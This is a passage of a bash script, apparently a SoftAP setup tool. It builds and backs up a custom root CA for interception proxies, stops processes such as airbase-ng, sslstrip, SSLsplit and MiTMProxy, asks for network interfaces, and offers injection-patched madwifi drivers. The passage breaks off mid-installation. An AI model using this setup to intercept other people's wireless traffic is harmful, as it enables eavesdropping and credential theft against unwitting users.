$friendly_name-ca.pem        CA private key and certificate in PEM format.         Proxies : MiTMProxy, HoneyProxy.
$friendly_name-ca-cert.pem   CA certificate in PEM format.                         Clients: IOS,IOS Simulator,Firefox,Java,OSX,*nix systems.
$friendly_name-ca-cert.p12   CA certificate in PKCS12 format.                      Clients: Windows platforms.
$friendly_name-ca-cert.crt   CA-private key and certificate encoded in binary DER. Clients: Android 4.x devices.

For pre 4.x Android device please visit:
http://wiki.cacert.org/FAQ/ImportRootCertAndroidPreICS
EOF

echo
$cecho ""$BLUE"Those files can be summarized in the file $HOME_DIR/CA-certificates/README:"$END"" | centered_text
echo
cat $HOME_DIR/CA-certificates/README
	
	#Let's make a backup of our certificates to $HOME_DIR/backup - Just in case...
		if [ ! -d $HOME_DIR/backup/CA-certificates/ ];then
			mkdir $HOME_DIR/backup/CA-certificates/
			cp $HOME_DIR/CA-certificates/$friendly_name-ca.key $HOME_DIR/backup/CA-certificates/$friendly_name-ca.key
			cp $HOME_DIR/CA-certificates/$friendly_name-ca.crt $HOME_DIR/backup/CA-certificates/$friendly_name-ca.crt
			cp $HOME_DIR/CA-certificates/$friendly_name-ca.pem $HOME_DIR/backup/CA-certificates/$friendly_name-ca.pem
			cp $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.pem
			cp $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.p12
			cp $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.crt
			cp $HOME_DIR/CA-certificates/README $HOME_DIR/backup/CA-certificates/README
		fi
	# Removing configuration file. 
	rm $HOME_DIR/CA-certificates/x509v3ca.cnf
	echo
	$cecho ""$RED"Location                            :"$GREEN"$HOME_DIR/CA-certificates/"$END""
	$cecho ""$RED"A backup of those files was made to :"$GREEN"$HOME_DIR/backup/CA-certificates/"$END""
	read -p 'Press ENTER to continue...' string;echo
else
	#Let's make a backup of our certificates to $HOME_DIR/backup (if backup was deleted)
	if [ ! -d $HOME_DIR/backup/CA-certificates/ ];then
		mkdir $HOME_DIR/backup/CA-certificates/
		cp $HOME_DIR/CA-certificates/$friendly_name-ca.key $HOME_DIR/backup/CA-certificates/$friendly_name-ca.key
		cp $HOME_DIR/CA-certificates/$friendly_name-ca.crt $HOME_DIR/backup/CA-certificates/$friendly_name-ca.crt
		cp $HOME_DIR/CA-certificates/$friendly_name-ca.pem $HOME_DIR/backup/CA-certificates/$friendly_name-ca.pem
		cp $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.pem
		cp $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.p12
		cp $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt $HOME_DIR/backup/CA-certificates/$friendly_name-ca-cert.crt
		cp $HOME_DIR/CA-certificates/README $HOME_DIR/backup/CA-certificates/README
	fi
	echo 
	$cecho ""$BLUE"T r u s t  A n c h o r  C e r t i f i c a t e s  ( r o o t  C A ):"$END"" | centered_text
	$cecho "[ "$GREEN"found"$END" ] Private Key: $HOME_DIR/CA-certificates/$friendly_name-ca.key"
	$cecho "[ "$GREEN"found"$END" ] Certificate: $HOME_DIR/CA-certificates/$friendly_name-ca.crt"
	$cecho "[ "$GREEN"found"$END" ] Certificate: $HOME_DIR/CA-certificates/$friendly_name-ca.pem"
	$cecho "[ "$GREEN"found"$END" ] Certificate: $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem"
	$cecho "[ "$GREEN"found"$END" ] Certificate: $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12"
	$cecho "[ "$GREEN"found"$END" ] Certificate: $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt"
fi

#################################################################################################################
# 					Stop - kill any running processes					#
# 			UDHCPD - DNSMASQ - SQUID3 - APACHE2 - AIRBASE-NG - SSLSTRIP - HAVEGED			#
#		PROXYCHAINS - TOR - HOSTAPD - ARM - I2P -SSLsplit - MiTMProxy - HoneyProxy			#
#################################################################################################################
echo

if [ -n "`pidof udhcpd`" ] || [ -n "`pidof dnsmasq`" ] || [ -n "`pidof squid3`" ] || [ -n "`pidof apache2`" ] || [ -n "`pidof airbase-ng`" ] || [ -n "`pidof tor`" ] || [ -n "`pidof arm`" ] || [ -n "`pidof wrappper`" ] || [ -n "`pidof java`" ] || [ -n "`pidof hostapd`" ] || [ -n "`ps aux | grep 'sslstrip' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ] || [ -n "`ps aux | grep 'sslsplit' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ] || [ -n "`ps aux | grep 'mitmproxy' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ] || [ -n "`ps aux | grep 'honeyproxy.py' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ] || [ -n "`ps aux | grep 'proxychains' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	echo ""$BLUE"R u n n i n g   P r o c e s s e s :"$END"" | centered_text
fi

# Stop udhcpd
if [ -n "`pidof udhcpd`" ];then
	$necho "[....] Stopping UDHCPD."
	kill "`pidof udhcpd`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping UDHCPD."
fi

# Stop dnsmasq
if [ -n "`pidof dnsmasq`" ];then
	$necho "[....] Stopping DNSmasq."
	kill "`pidof dnsmasq`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping DNSmasq."
fi

#Stop squid3
if [ -n "`pidof squid3`" ];then
	/etc/init.d/squid3 stop
fi

#Stop apache2
if [ -n "`pidof apache2`" ];then
	/etc/init.d/apache2 stop
fi

# Kill airbase-ng
if [ -n "`pidof airbase-ng`" ];then
	$necho "[....] Stopping Airbase-ng."
	kill "`pidof airbase-ng`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping Airbase-ng."
fi

# Stop TOR
if [ -n "`pidof tor`" ];then
	/etc/init.d/tor stop
fi

# Stop ARM
if [ -n "`pidof arm`" ];then
	$necho "[....] Stopping ARM (Anonymizing Relay Monitor)."
	kill "`pidof arm`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping ARM (Anonymizing Relay Monitor)."
fi

# Stop I2P
if [ -n "`pidof wrappper`" ] || [ -n "`pidof java`" ];then
	$i2prouter_path/i2prouter stop
fi

# Stop hostapd
if [ -n "`pidof hostapd`" ];then
	$necho "[....] Stopping Hostapd."
	kill "`pidof hostapd`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping Hostapd."
fi

# Stop SSLstrip
if [ -n "`ps aux | grep 'sslstrip' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	$necho "[....] Stopping SSLstrip."
	kill "`ps aux | grep 'sslstrip' | grep "xterm" | grep -v "grep" | awk '{print $2}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping SSLstrip."
fi

# Stop haveged.
if [ -n "`pidof haveged`" ];then
	$necho "[....] Stopping Haveged."
	kill "`pidof haveged`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping Haveged."
fi

# Stop SSLsplit
if [ -n "`ps aux | grep 'sslsplit' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	$necho "[....] Stopping SSLsplit."
	kill "`ps aux | grep 'sslsplit' | grep "xterm" | grep -v "grep" | awk '{print $2}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping SSLsplit."
fi

# Stop MitmProxy
if [ -n "`ps aux | grep 'mitmproxy' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	$necho "[....] Stopping Mitmroxy."
	kill "`ps aux | grep 'mitmproxy' | grep "xterm" | grep -v "grep" | awk '{print $2}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping Mitmroxy."
fi

# Stop HoneyProxy
if [ -n "`ps aux | grep 'honeyproxy.py' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	$necho "[....] Stopping HoneyProxy."
	kill "`ps aux | grep 'honeyproxy.py' | grep "xterm" | grep -v "grep" | awk '{print $2}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping HoneyProxy."
fi

# Stop Proxychains
if [ -n "`ps aux | grep 'proxychains' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	$necho "[....] Stopping Proxychains."
	kill "`ps aux | grep 'proxychains' | grep "xterm" | grep -v "grep" | awk '{print $2}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping Proxychains."
fi

# Stop real time WLAN's informations.
if [ -n "`ps aux | grep 'watch' | grep "xterm" | grep -v "grep" | awk '{print $2}'`" ];then
	$necho "[....] Stopping WLAN's real time informations."
	kill "`ps aux | grep 'watch' | grep "xterm" | grep -v "grep" | awk '{print $2}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping WLAN's real time informations."
fi

# Kill xterm
if [ -n "`pidof xterm`" ];then
	$necho "[....] Stopping proxychains and/or hostapd"
	kill "`pidof xterm | awk '{print $1}'`"
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping proxychains and/or hostapd"
fi

#Give some time to the user to be able to read the above.
sleep 3
clear

#################################################################################################################
# Restoring network interface, in case the user have 2 or more wireless NICs and wants to use one or another,	#
# 	but only if he/she decide to be prompt to. ($INET_WIRELESS_PROMPT is set to "yes")			#
#################################################################################################################
echo

if [ -n "`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ -n "`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	export IFACE="`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	export WIFACE="`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	# Restore everything when wake-up from suspend and we loose the wireless or Internet interface names.
	if [ ! -n "`ls /sys/class/net | grep "$IFACE"`" ] || [ ! -n "`ls /sys/class/net | grep "$WIFACE"`" ];then
		clear
		$cecho ""$BLUE"R e s t o r i n g  I n t e r n e t  &  W i r e l e s s  I n t e r f a c e s"$END"" | centered_text
		echo
		$cecho ""$BLUE"Wake Up From Suspend"$END"" | centered_text
		echo
		echo
		export INET_WIRELESS_PROMPT="yes"
		export HOSTAP_AIRBASE_PROMPT="yes"
		export IFACE=""
		export WIFACE=""
		export WIFACE_MON=""
		sed 's%INET_CONX.*%INET_CONX '$IFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
		sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
		sed 's%WIFACE_MON.*%WIFACE_MON '$WIFACE_MON'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
		cp $HOME_DIR/backup/interfaces /etc/network/interfaces
		service network-manager stop
		service networking stop
		service networking start
		service network-manager start
		sleep 1
		$necho "[....] Waiting to connect again to the Internet."
			until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
				for i in \| / - \\; do
					printf ' [%c]\b\b\b\b' $i 
					sleep .1 
				done 
			done
		$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "

	fi
fi

if [ "$INET_WIRELESS_PROMPT" = "yes" ] && [ -n "`grep "iface "$WIFACE" inet manual" /etc/network/interfaces`" ] && [ "`iw dev | grep 'phy#' | wc -l`" -ge "2" ];then
	clear
	$cecho ""$BLUE"R e s t o r i n g  W i r e l e s s  I n t e r f a c e"$END"" | centered_text
	echo
	$cecho "Restoring: "$GREEN"$WIFACE - "`ls /sys/class/net/"$WIFACE"/device/driver/module/drivers`""$END" wireless NIC"
	echo
	echo
	cp $HOME_DIR/backup/interfaces /etc/network/interfaces 
	service network-manager stop
	service networking stop
	service networking start
	service network-manager start
	sleep 1
	$necho "[....] Waiting to connect again to the Internet."
		until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
			for i in \| / - \\; do
				printf ' [%c]\b\b\b\b' $i 
				sleep .1 
			done 
		done
	$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "

		# Both (or more) wireless NIC's get connected to Internet?
		if [ "`/sbin/route -n | awk '{print $2}' | grep "0.0.0.0" | wc -l`" -ge "2" ];then
			export STATE="`nmcli dev status | head -1 | awk '{print $3}'`"
			export ONLINE_IFACE="`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`"
			export CONNECTED="`nmcli dev status | grep "$ONLINE_IFACE" | awk '{print $3}'`"
			echo
			echo "Most probably network manager automatically connects you again to the Internet"
			echo "using the wireless NIC with the strongest signal or sometimes gets confused and"
			echo "it's using all your wireless NIC's to connect to (if you have more then one)"
			$cecho "Please check the following and if you see "$RED""$STATE" "$CONNECTED""$END" on more then one"
			$cecho "wireless NIC then please "$RED"disconnect manually then one"$END" that you don't want, from your network manager,"
			$cecho ""$GREEN"leave only one connected to Internet and press Enter"$END""
			nmcli dev status
		fi
	echo
	echo "If you want to use another wireless NIC, do it now manually and press Enter"
	echo "If you DON'T want to change anything just press Enter and give" 
	echo "the same interfaces that you did before"
	echo
	# Make sure user knows that he/she can set INET_WIRELESS_PROMPT to no. (Don't prompt every time)
	echo "Please have in mind that if you DON'T want to be prompted every time for your Internet"
	$cecho "and wireless interfaces you can set "$RED"INET_WIRELESS_PROMPT yes"$END" to "$GREEN"INET_WIRELESS_PROMPT no"$END""
	$cecho "in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
	echo
	read -p 'Press ENTER to continue...' string;echo
	#else
		
		# Debug"
		#echo "Doesn't work"
		#echo "INET_WIRELESS_PROMPT: $INET_WIRELESS_PROMPT"
		#echo "IFACE: $IFACE"
		#echo "WIFACE: $WIFACE"
		#echo "iw dev | grep 'phy#' | wc -l: "`iw dev | grep 'phy#' | wc -l`""
		#echo "grep 'iface $WIFACE inet manual' /etc/network/interfaces: "`grep 'iface $WIFACE inet manual' /etc/network/interfaces`"" 
		#exit 1
	fi

# Both (or more) wireless NIC's get connected to Internet?
if [ "`/sbin/route -n | awk '{print $2}' | grep "0.0.0.0" | wc -l`" -ge "2" ];then
	clear
	export STATE="`nmcli dev status | head -1 | awk '{print $3}'`"
	export ONLINE_IFACE="`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`"
	export CONNECTED="`nmcli dev status | grep "$ONLINE_IFACE" | awk '{print $3}'`"
	$cecho ""$BLUE"R e s t o r i n g  W i r e l e s s  I n t e r f a c e"$END"" | centered_text
	echo
	echo
	echo "Most probably network manager automatically connects you again to the Internet"
	echo "using the wireless NIC with the strongest signal or sometimes gets confused and"
	echo "is using all your wireless NIC's to connect to (if you have more then one)"
	$cecho "Please check the following and if you see "$RED""$STATE" "$CONNECTED""$END" on more then one"
	$cecho "wireless NIC then please "$RED"disconnect manually then one"$END" that you don't want,"
	$cecho ""$GREEN"leave only one connected to Internet and press Enter"$END""
	nmcli dev status
	read -p 'Press ENTER to continue...' string;echo
fi

# Check again and exit (Enter pressed by accident)
if [ "`/sbin/route -n | awk '{print $2}' | grep "0.0.0.0" | wc -l`" -ge "2" ];then
	clear
	$cecho ""$BLUE"R e s t o r i n g  W i r e l e s s  I n t e r f a c e"$END"" | centered_text
	echo
	echo
	$cecho ""$RED"Nope!"$END""
	echo "You CAN'T continue. You are connected to Internet with more than one"
	echo "wireless NIC. Sorry. Exit..."
	exit 1
fi

#################################################################################################################
# 						Get Internet Interface						#
# 		If exist in aerial.conf and INET_WIRELESS_PROMPT is set to "no" then get it from there		#
#################################################################################################################
IFACE_HEAD(){ 
	clear
	$cecho ""$BLUE"I n t e r n e t  a n d  W i r e l e s s   i n t e r f a c e s :"$END"" | centered_text
	echo
	$cecho ""$BLUE"Internet Interface"$END"" | centered_text
	echo
	echo
}

IFACE_MENU(){ 
	if [ -n "`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
		# Make sure user knows that he/she can set INET_WIRELESS_PROMPT to no. (Don't prompt every time)
		export IFACE="`ip route show to 0.0.0.0/0 | awk '{print $5}'`"
		echo "Please have in mind that if you DON'T want to be prompted every time for your Internet"
		$cecho "and wireless interfaces you can set "$RED"INET_WIRELESS_PROMPT yes"$END" to "$GREEN"INET_WIRELESS_PROMPT no"$END""
		$cecho "in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
		echo
		$cecho "You're currently using:"
		$cecho "Internet through      : "$GREEN"$IFACE - "`ls /sys/class/net/"$IFACE"/device/driver/module/drivers`""$END""
		echo
		echo "Enter the name of the interface that you are"
		$cecho "connected to the Internet, [e.g."$RED"ppp0"$END","$RED"eth0"$END","$RED"wlan0"$END" ]"
		$necho "Press ENTER for current ("$GREEN""$IFACE""$END"): "
	else
		export IFACE="`ip route show to 0.0.0.0/0 | awk '{print $5}'`"
		$cecho "It looks like you are using:"
		$cecho "Internet through           : "$GREEN"$IFACE - "`ls /sys/class/net/"$IFACE"/device/driver/module/drivers`""$END""
		echo
		$cecho "If this is correct you can press ENTER"
		echo
		echo "Enter the name of the interface that you are"
		$cecho "connected to the Internet, [e.g."$RED"ppp0"$END","$RED"eth0"$END","$RED"wlan0"$END" ]"
		$necho "Press ENTER for current ("$GREEN""$IFACE""$END"): "
	fi
}



if [ "$INET_WIRELESS_PROMPT" = "no" ] && [ -n "`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	export IFACE="`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`"
else
	IFACE_HEAD
	IFACE_MENU
	while read IFACE
		do
		if [ -z "${IFACE}" ] && [ -n "`ip route show to 0.0.0.0/0 | awk '{print $5}'`" ];then
			export IFACE="`ip route show to 0.0.0.0/0 | awk '{print $5}'`"
			sed 's%INET_CONX.*%INET_CONX '$IFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			ifconfig $IFACE up
			break
		elif [ -z "${IFACE}" ] && [ -n "`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep 'INET_CONX' $HOME_DIR/aerial.conf | awk '{print $2}'`" != "`ip route show to 0.0.0.0/0 | awk '{print $5}'`" ];then
			export IFACE="`ip route show to 0.0.0.0/0 | awk '{print $5}'`"
			sed 's%INET_CONX.*%INET_CONX '$IFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			ifconfig $IFACE up
			break
		elif [ -z "${IFACE}" ];then
			#sed 's%INET_CONX.*%INET_CONX '$IFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			IFACE_HEAD
			echo "Available interface(s) are:"
			echo "`ls /sys/class/net | grep -v "lo"`"
			echo
			$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
			$cecho ""$RED"You must enter how you are connected to Internet"$END""
			echo
			IFACE_MENU 
		elif [ -n "`ls /sys/class/net | grep -ow "$IFACE"`" ];then
			sed 's%INET_CONX.*%INET_CONX '$IFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			ifconfig $IFACE up
			break
		elif [ ! -n "`ls /sys/class/net | grep -ow "$IFACE"`" ];then
			IFACE_HEAD
			echo "Available interface(s) are:"
			echo "`ls /sys/class/net | grep -v "lo"`"
			echo
			$cecho "Internet interface "$RED""$IFACE""$END" not found in your system"
			echo "Please check the name again"
			echo
			IFACE_MENU
		else
			IFACE_HEAD
			echo "Available interface(s) are:"
			echo "`ls /sys/class/net | grep -v "lo"`"
			echo
			$cecho "Internet interface "$RED""$IFACE""$END" not found in your system"
			echo "Please check the name again"
			echo
			IFACE_MENU
		fi
	done
fi

#################################################################################################################
# 					Get Wireless interface.							#
# 		If exist in aerial.conf and INET_WIRELESS_PROMPT is set to "no" then get it from there		#
#################################################################################################################
WIFACE_HEAD(){ 
	clear
	$cecho ""$BLUE"I n t e r n e t  a n d  W i r e l e s s   i n t e r f a c e s :"$END"" | centered_text
	echo
	$cecho ""$BLUE"SoftAP Wireless Interface"$END"" | centered_text
	echo
	echo
}

WIFACE_MENU(){ 
if [ -n "`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
		# Make sure user knows that he/she can set INET_WIRELESS_PROMPT to no. (Don't prompt every time)
		export WIFACE="`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | head -1`"
		echo "Please have in mind that if you DON'T want to be prompted every time for your Internet"
		$cecho "and wireless interfaces you can set "$RED"INET_WIRELESS_PROMPT yes"$END" to "$GREEN"INET_WIRELESS_PROMPT no"$END""
		$cecho "in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
		echo
		$cecho "You're currently using:"
		$cecho "SoftAP through        : "$GREEN"$WIFACE - "`ls /sys/class/net/"$WIFACE"/device/driver/module/drivers`""$END""
		echo
		if [ "`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | wc -l`" -ge 2 ];then
			echo "Available wireless interface(s) are:"
				for c in $(seq 1 "`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | wc -l`")
					do 
						if [ -n "`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | sed -n ''$c',+0p'`" ];then
							export WIFACE1="`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | sed -n ''$c',+0p'`"
							$cecho "Interface No "$c": "$GREEN"$WIFACE1 - "`ls /sys/class/net/"$WIFACE1"/device/driver/module/drivers`""$END""
						fi
						c="`expr $c + 1`"
					done
			echo
		fi
		echo "Enter your SoftAP's wireless interface name"
		$cecho "[e.g."$RED"wlan0"$END", "$RED"wifi0"$END", "$RED"ra0"$END", "$RED"rausb0"$END"]"
		$necho "Press ENTER for current ("$GREEN""$WIFACE""$END"): "
	else
		export WIFACE="`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | head -1`"
		if [ -z "${WIFACE}" ];then
			echo "Oops!!!"
			echo "Cannot be found any available wirelles NICs"
			$cecho "SoftAP through                 : "$RED"None?"$END""
			echo
			echo "Enter your softAP's wireless interface name"
			$necho "[e.g."$RED"wlan0"$END", "$RED"wifi0"$END", "$RED"ra0"$END", "$RED"rausb0"$END"]: "
		else	
			echo "Available wireless interface(s) are:"
				for c in $(seq 1 "`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | wc -l`")
					do 
						if [ -n "`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | sed -n ''$c',+0p'`" ];then
							export WIFACE="`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | sed -n ''$c',+0p'`"
							$cecho "Interface No "$c": "$GREEN"$WIFACE - "`ls /sys/class/net/"$WIFACE"/device/driver/module/drivers`""$END""
						fi
						c="`expr $c + 1`"
					done
			echo
			$cecho "It looks like you are able to use:"
			$cecho "SoftAP through                   : "$GREEN"$WIFACE - "`ls /sys/class/net/"$WIFACE"/device/driver/module/drivers`""$END""
			echo
			$cecho "If this is correct you can press ENTER"
			echo
			echo "Enter your softAP's wireless interface name"
			$cecho "[e.g."$RED"wlan0"$END", "$RED"wifi0"$END", "$RED"ra0"$END", "$RED"rausb0"$END"]"
			$necho "Press ENTER for current ("$GREEN""$WIFACE""$END"): "
		fi
	fi
}

if [ "$INET_WIRELESS_PROMPT" = "no" ] && [ -n "`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	export WIFACE="`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	export PHY="phy"`iw "$WIFACE" info | tail -1 | awk '{print $2}'`""
else
	WIFACE_HEAD
	WIFACE_MENU
	while read WIFACE
		do
		if [ "$IFACE" = "$WIFACE" ];then
			WIFACE_HEAD
			$cecho "You are trying to use the same interface for Internet connection ("$RED""$IFACE""$END")"
			$cecho "and for the creation of the SoftAP ("$RED""$WIFACE"$END"")."
			$cecho "Sorry... you can't do that!"
			echo
			echo "Please check the name again and enter your softAP's wireless interface name"
			echo
			WIFACE_MENU
		elif [ -z "${WIFACE}" ] && [ -n "`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | head -1`" ];then
			export WIFACE="`ls /sys/class/net | grep -v "lo\|"$IFACE"\|mon\|eth\|ppp\|sit" | head -1`"
			export PHY="phy"`iw "$WIFACE" info | tail -1 | awk '{print $2}'`""
			sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			ifconfig $WIFACE up
			break
		#elif [ -z "${WIFACE}" ] && [ -n "`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			#export WIFACE="`grep 'WIRELS_IFACE' $HOME_DIR/aerial.conf | awk '{print $2}'`"
			#export PHY="phy"`iw "$WIFACE" info | tail -1 | awk '{print $2}'`""
			#sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			#ifconfig $WIFACE up
			#break
		elif [ -z "${WIFACE}" ];then
			#sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			WIFACE_HEAD
			$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
			$cecho ""$RED"You must enter your SoftAP's wireless interface name"$END""
			echo
			WIFACE_MENU
		elif [ -n "`ifconfig $WIFACE | grep 'inet addr' | awk '{print $2}' | sed -e 's/.*://'`"  ] && [ "`ifconfig $WIFACE | grep 'inet addr' | awk '{print $2}' | sed -e 's/.*://'`" != "192.168.60.129" ];then
			#sed 's%WIRELS_IFACE.*%WIRELS_IFACE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			WIFACE_HEAD
			$cecho ""$RED"It looks that "$END""$GREEN""$IFACE""$END""$RED" is used to connect to the Internet"$END""
			echo "Please check the name again"
			echo
			WIFACE_MENU	
		elif [ -n "`ls /sys/class/net | grep -ow "$WIFACE"`" ];then
			export PHY="phy"`iw "$WIFACE" info | tail -1 | awk '{print $2}'`""
			sed 's%WIRELS_IFACE.*%WIRELS_IFACE '$WIFACE'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			ifconfig $WIFACE up
			break
		elif [ ! -n "`ls /sys/class/net | grep -ow "$WIFACE"`" ];then
			WIFACE_HEAD
			$cecho "Wireless interface "$RED""$WIFACE""$END" not found in your system"
			echo "Please check the name again"
			echo
			WIFACE_MENU
		else
			WIFACE_HEAD
			$cecho "Internet interface "$RED""$WIFACE""$END" not found in your system"
			echo "Please check the name again"
			echo
			WIFACE_MENU
		fi
	done
fi

#################################################################################################################
#					Get Internet IP.							#
#################################################################################################################
export INETIP="`/sbin/ifconfig $IFACE | grep 'inet addr' | awk '{print $2}' | sed -e 's/.*://'`"

#################################################################################################################
# 			Check if we are using a Atheros based wireless card					#
# 				and we are not using madwifi-ng drivers,					#
# 					so we can install them.							#
#														#
# 					DON'T TRY IT IN KALI!!!!						#
#################################################################################################################
if [ "$ATH_PROMPT" = "yes" ] && [ -n "$ATH" ] && [ ! -f /lib/modules/`uname -r`/net/ath_pci.ko ];then
	clear
	YN=3
	$cecho "You have a "$GREEN""`lspci | grep 'Atheros' | grep 'Wireless' | grep 'Network' | awk '{print $4" "$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13}'`""$END" based card and madwifi-ng aren't installed"
	echo "To use master mode, they must be installed. Would like to:"
	echo
	echo "1. Install madwifi-ng (revision 4180 - patched for injection). "
	echo "2. Continue (Using the existing drivers)."
	echo
	echo "-----------------------------------------------------------------------------"
	$cecho ""$RED"Master mode compatible cards at http://madwifi-project.org/wiki/Compatibility"$END""
	echo "-----------------------------------------------------------------------------"
	echo
	$necho "Please enter your choice (1 - 2): "
		while [ "$YN" = "3" ]
		do
			read YN
			if [ "$YN" = "1" ] || [ "$YN" = "2" ];then
				if [ "$YN" = "1" ];then
					if [ -d $HOME_DIR/backup/net ] && [ -d $HOME_DIR/backup/ath/ath5k ] && [ -d $HOME_DIR/backup/ath/ath9k ] && [ -d $HOME_DIR/madwifi-ng ] && [ -f $HOME_DIR/backup/ath/ath.ko ];then
						clear
						$cecho ""$RED"Installing madwifi-ng drivers revision 4180"$END""
						echo
						$cecho ""$RED"Wireless interface down..."$END""
						ifconfig $WIFACE down
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Unloading drivers..."$END""
						modprobe -r ath5k
